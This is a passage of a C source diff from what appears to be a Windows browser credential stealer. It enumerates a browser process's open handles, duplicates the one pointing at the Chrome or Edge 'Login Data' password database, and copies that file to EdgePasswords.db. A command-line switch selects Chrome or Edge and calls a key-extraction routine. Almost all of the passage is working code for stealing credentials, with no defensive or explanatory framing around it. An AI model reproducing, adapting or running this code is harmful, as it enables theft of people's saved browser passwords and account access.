+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
+        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
+            printf("Last Error: %d\n", GetLastError());
+            SetLastError(0);
+            //printf("same PID\n");
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            ULONG returnLength = 0;
+            NTSTATUS ret = 0;
+            HANDLE dupHandle = NULL;
 
-                        HANDLE hDuplicate = NULL;
-                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            printf("DuplicateHandle failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;                   
-                        }
-                        //when file does not exist on disk, error 87 thrown
-                        DWORD dwError2 = NULL;
-                        dwError2 = GetLastError();
-                        printf("Last Error: %d\n", dwError2);
-                        if(dwError2 == 87) {
-                            SetLastError(0);
-                            printf("Wrong Function Call Somewhere \n");
-                            //GlobalFree(shi);
-                            continue;
-                        }
+            //printf("Granted Access: %08x\n", handle.GrantedAccess);
+            //printf("Handle Attributes: %08x\n", handle.HandleAttributes);
 
-                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        ZeroMemory(filename, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        
-
-                        printf("%s\n", filename);
-                        printf("Length of file name is %d\n", strlen(filename));
-                        
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = strlen(filename);
-                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(strcmp(newFilename, "Application") == 0) {
-                                printf("SKIPPING PID %d\n", PID);
-                                GlobalFree(shi);
-                                return FALSE;
-                            }
-                        }
-
-                        if(strstr(filename, "Login Data") != NULL) {
-                            printf("LOGIN DATA WAS FOUND\n");
-                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
-                            printf("file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            HANDLE hFile = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            CloseHandle(hFile);
-
-                            GlobalFree(buffer);
-                            return TRUE;
-                        }
-
-                        CloseHandle(hDuplicate);
+            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
+                //printf("Opening process\n");
+                HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                if(hProc == INVALID_HANDLE_VALUE) {
+                    printf("OpenProcess failed %d\n", GetLastError());
+                    GlobalFree(shi);
+                    return FALSE;
                 }
+                if (!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) 
+                {
+                    printf("Duplicate Handle failed %d\n", GetLastError());
+                    continue;
+                }
+                //Check if the handle exists on disk, otherwise the program will hang
+                DWORD fileType = GetFileType(dupHandle);
+                if (fileType != FILE_TYPE_DISK) {
+                    continue;
+                }
+                if(GetLastError() == 87) {
+                            SetLastError(0);
+                            printf("Wrong Function Call \n Skipping handle \n");
+                            //KERNEL32$GlobalFree(shi);
+                            continue;
+                }
+                ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+                //if return length is not 0
+                //printf("Return Length: %d\n", returnLength);
+                if (ret != 0)
+                {
+                    printf("NtQueryObject failed with status 0x%x.\n",ret);
+                    printf("LastError: %d\n", GetLastError());
+                    SetLastError(0);
+                    objectNameInfo = realloc(objectNameInfo, returnLength);
+                    ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
+                }
+                
+                if (ret == 0 && objectNameInfo->Name.Length > 0){
+                    printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    char handleName[1024];
+                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    if (ret != 0)
+                    {
+                        objectTypeInfo = realloc(objectTypeInfo, returnLength);
+                        ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
+                    }
+                    printf("%d\n", GetLastError());
+                    SetLastError(0);
+                    if (ret == 0 && strcmp(objectTypeInfo,"File")){
+                        if (strstr(handleName, "Login Data") != NULL) {
+                                printf("Login Data WAS FOUND\n");
+                                printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                                SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
+                                DWORD dwFileSize = GetFileSize(dupHandle, NULL);
+                                printf("file size is %d\n", dwFileSize);
+                                DWORD dwRead = 0;
+                                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                                ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
+
+                                HANDLE hFile = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                                CloseHandle(hFile);
+
+                                GlobalFree(buffer);
+                                return TRUE;
+                            }
+                            
+                    }
+                    else{
+                        CloseHandle(dupHandle);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
+                    }
+                } 
+                
             }
         }
     }
-    printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
+
+    printf("NO HANDLE TO Login Data WAS FOUND \n");
     return FALSE;
 }
 
@@ -826,7 +968,8 @@ int main(int argc, char* argv[]) {
     }
     if(strcmp(argv[1], "--chrome") == 0){
         GetChromeKey();
-        GetChromePID();
+        //GetChromePID();
+        GetChromeDatabase(4632);
         return 0;
     }
     if(strcmp(argv[1], "--edge") == 0){
